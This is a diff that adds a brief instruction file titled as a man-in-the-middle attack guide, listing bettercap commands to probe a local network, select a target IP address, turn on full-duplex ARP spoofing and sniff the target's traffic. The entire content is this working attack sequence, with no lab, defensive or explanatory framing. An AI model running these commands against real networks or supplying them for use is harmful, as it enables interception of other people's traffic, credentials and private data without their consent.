@@ -1,0 +1,22 @@
+Instructions for Man-in-the-middle (MITM) attack
+
+Open terminal
+
+sudo bettercap --iface [Network Interface]
+
+net.probe on
+
+net.show
+
+
+Find IP address of target
+
+set arp.spoof.fullduplex true
+
+set arp.spoof.targets [Ip Address]
+
+arp.spoof on
+
+net.sniff on
+
+
